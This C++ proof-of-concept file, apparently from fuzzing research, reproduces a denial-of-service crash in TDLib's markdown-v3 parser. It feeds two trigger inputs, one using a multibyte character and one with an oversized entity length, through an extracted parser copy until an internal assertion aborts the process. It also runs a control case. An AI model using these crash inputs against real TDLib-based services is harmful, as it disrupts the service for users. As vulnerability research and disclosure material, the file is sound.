// TDLib markdown-v3 metric-mismatch DoS PoC (build-independent reproduction).
//
// Includes the standalone faithful extraction of parse_markdown_v3_without_pre
// (fuzz_utf16_harness.cpp: verbatim bodies from td/telegram/MessageEntity.cpp,
// utf8 counting from tdutils; CHECK -> __builtin_trap()) and drives it with the
// two CONFIRMED trigger cases from the campaign, plus a control.
//
// Why build-independent: the real full-TDLib ASAN build aborts at
// MessageEntity.cpp:2835 on the same input (REPORT-TDLIB-CONFIRMED-DoS.md,
// proof_min.cpp). This macro-extraction reproduces the identical invariant
// failure (CHECK(entity.offset + entity.length <= utf16_offset)) without
// needing the full TDBuild, so anyone can confirm the seam.
//
// Build: g++ -O1 -g -o poc_markdown_v3_metric_mismatch \
//          poc_markdown_v3_metric_mismatch.cpp
// Run:   ./poc_markdown_v3_metric_mismatch
//   -> "TRIGGER 1 ... " then SIGILL/SIGABRT (the CHECK fires, process aborts)
//   -> Comment out the trigger lines to see the control case return cleanly.
#include <cstdio>
#include <string>
#include <vector>
#include "fuzz_utf16_harness.cpp"   // verbatim parser extraction + MessageEntity

static void run(const char *label, const std::string &text,
                int off, int len, bool fatal) {
  std::fprintf(stderr, "%s: text=\"%s\" entity{off=%d,len=%d} ... ", label,
               text.c_str(), off, len);
  std::fflush(stderr);
  std::vector<MessageEntity> e;
  e.emplace_back(MessageEntity::Type::Bold, off, len);
  auto r = parse_markdown_v3_without_pre(Slice(text), std::move(e));
  std::fprintf(stderr, "clean (rc=n/a) text=\"%s\" nent=%zu\n",
               r.text.c_str(), r.entities.size());
  (void)fatal;
}

int main() {
  std::fprintf(stderr, "TDLib markdown-v3 metric-mismatch PoC (CHECK->trap)\n");

  // CONFIRMED #1 (from fuzz_runs/crash-...e52ed1c / proof_min): multibyte é at
  // markup tail + entity offset straddling the vom boundary drives utf16_offset
  // past entity.offset+entity.length -> CHECK fires -> abort.
  std::string t1 = "\xC3\xA9**x**";   // é**x**   (é = 2 bytes)
  run("TRIGGER 1 (é**x** off=5 len=2)", t1, 5, 2, true);

  // CONFIRMED #2 (fuzz_runs/crash-...790ed3a): markup only, entity length far
  // larger than the text -> off+len exceeds utf16 length -> CHECK fires.
  std::string t2 = "**";
  run("TRIGGER 2 (** off=8 len=0x7878)", t2, 8, 0x7878, true);

  // CONTROL: consistent entity inside the text -> parse returns cleanly.
  std::string t3 = "**bold**";
  run("CONTROL (**bold** off=0 len=4)", t3, 0, 4, false);

  std::fprintf(stderr, "no abort fired (all cases clean) — parse self-consistent here\n");
  return 0;
}